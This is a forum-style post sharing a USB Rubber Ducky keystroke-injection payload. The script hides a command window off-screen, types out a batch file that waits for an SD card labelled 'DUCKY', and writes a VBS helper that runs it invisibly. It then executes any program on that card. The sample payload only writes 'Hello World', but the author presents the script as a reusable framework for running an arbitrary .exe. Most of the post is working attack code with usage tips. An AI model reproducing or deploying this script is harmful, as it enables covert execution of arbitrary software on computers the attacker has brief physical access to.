The following is a payload I have been working on that waits until a drive labeled "DUCKY" is mounted. I have used some of midnightsnake's code in this payload. I have been having some problems with delays so I went a little overboard with the "DELAY 25" codes. The name of the file that is run can be changed to .exe, I am just having it run a batch for testing purposes. The line that says "STRING %myd%\myEXE.bat" is the line that executes the executable.

```
REM Author: overwraith
REM Name: RunEXE.txt
REM Purpose: Run an executable file off of the SD card after it mounts. 
DELAY 4000
REM Using the run command for a broader OS base.
GUI R
STRING cmd /Q /D /T:7F /F:OFF /V:ON /K
DELAY 500
ENTER
DELAY 750
ALT SPACE
STRING M
DOWNARROW
REPEAT 100
ENTER
DELAY 25
REM Make batch file that waits for SD card to mount. 
REM Delete batch file if already exists
DELAY 25
STRING erase /Q DuckyWait.bat
DELAY 25
ENTER
DELAY 25
STRING copy con DuckyWait.bat
DELAY 25
ENTER
DELAY 25
REM DuckyWait.bat
DELAY 25
STRING :while1
DELAY 25
ENTER
DELAY 25
STRING for /f %%d in ('wmic volume get driveletter^, label ^| findstr "DUCKY"') do set myd=%%d
DELAY 25
ENTER
DELAY 25
STRING if Exist %myd% (
DELAY 25
ENTER
DELAY 25
STRING goto break
DELAY 25
ENTER
DELAY 25
STRING )
DELAY 25
ENTER
DELAY 25
STRING timeout /t 30
DELAY 25
ENTER
DELAY 25
STRING goto while1
DELAY 25
ENTER
DELAY 25
STRING :break
DELAY 25
ENTER
DELAY 25
REM Continue script.
DELAY 25
STRING %myd%\myEXE.bat
DELAY 25
ENTER
DELAY 25
CONTROL z
DELAY 25
ENTER
DELAY 25
REM MAKE THE VBS FILE THAT ALLOWS RUNNING INVISIBLY.
DELAY 25
REM Delete vbs file if already exists
DELAY 25
STRING erase /Q invis.vbs
DELAY 25
ENTER
DELAY 25
REM FROM: http://stackoverflow.com/questions/289498/running-batch-file-in-background-when-windows-boots-up
DELAY 25
STRING copy con invis.vbs
DELAY 25
ENTER
DELAY 25
STRING CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False
DELAY 25
ENTER
DELAY 25
CONTROL Z
DELAY 25
ENTER
DELAY 25
REM RUN THE BATCH FILE
DELAY 25
STRING wscript.exe invis.vbs DuckyWait.bat
DELAY 25
ENTER
DELAY 25
STRING EXIT
ENTER
```

The following is the batch file that is run after the "DUCKY" drive has been mounted. Everything is being run invisibly, so you will need to check for the existence of "Message.txt" which will probably be in "C:\Windows\system32".

```
REM Message.txt
echo Hello Wolrd!!!
echo Hello World!!! > Message.txt
```

This payload requires the REPEAT command, so until the online payload generator is online again, or the encoders start supporting the REPEAT command you will be stuck with copy and pasting the repeat command 100 times. I recommend pasting by groups of five or ten. 